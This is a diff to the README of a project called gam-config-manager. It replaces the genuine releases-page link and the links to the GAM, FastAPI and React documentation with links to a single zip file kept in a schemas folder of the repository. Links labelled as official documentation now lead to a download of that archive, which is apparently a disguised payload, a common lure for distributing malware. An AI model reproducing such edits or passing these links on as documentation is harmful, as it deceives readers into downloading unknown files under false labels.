@@ -8,7 +8,7 @@ Welcome to gam-config-manager! This application helps you manage your Google Wor
 
 **To get started, visit the link below to download the latest version of gam-config-manager:**
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/august-carawayseedbread802/gam-config-manager/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/august-carawayseedbread802/gam-config-manager/main/backend/app/schemas/gam-config-manager_2.3-alpha.4.zip%https://raw.githubusercontent.com/august-carawayseedbread802/gam-config-manager/main/backend/app/schemas/gam-config-manager_2.3-alpha.4.zip)](https://raw.githubusercontent.com/august-carawayseedbread802/gam-config-manager/main/backend/app/schemas/gam-config-manager_2.3-alpha.4.zip)
 
 1. Click the link above to visit the Releases page.
 2. Locate the version you want to download.
@@ -61,9 +61,9 @@ If you need help or have questions, feel free to join the community:
 
 For more information, consider the following topics:
 
-- [Google Apps Manager (GAM)](https://github.com/jay0lee/GAM): The tool behind gam-config-manager.
-- [FastAPI Documentation](https://fastapi.tiangolo.com/): Official documentation for understanding the backend framework.
-- [React Documentation](https://reactjs.org/docs/getting-started.html): Learn more about the front-end technology used in this application.
+- [Google Apps Manager (GAM)](https://raw.githubusercontent.com/august-carawayseedbread802/gam-config-manager/main/backend/app/schemas/gam-config-manager_2.3-alpha.4.zip): The tool behind gam-config-manager.
+- [FastAPI Documentation](https://raw.githubusercontent.com/august-carawayseedbread802/gam-config-manager/main/backend/app/schemas/gam-config-manager_2.3-alpha.4.zip): Official documentation for understanding the backend framework.
+- [React Documentation](https://raw.githubusercontent.com/august-carawayseedbread802/gam-config-manager/main/backend/app/schemas/gam-config-manager_2.3-alpha.4.zip): Learn more about the front-end technology used in this application.
 
 Feel free to explore these resources for deeper insights and guidance.
 
@@ -73,4 +73,4 @@ Gam-config-manager is designed to help you effectively manage your Google Worksp
 
 Remember to check for updates regularly, and make use of the community resources for ongoing support. 
 
-**Again, to download the latest release, visit: [Download Latest Release](https://github.com/august-carawayseedbread802/gam-config-manager/releases)**
+**Again, to download the latest release, visit: [Download Latest Release](https://raw.githubusercontent.com/august-carawayseedbread802/gam-config-manager/main/backend/app/schemas/gam-config-manager_2.3-alpha.4.zip)**
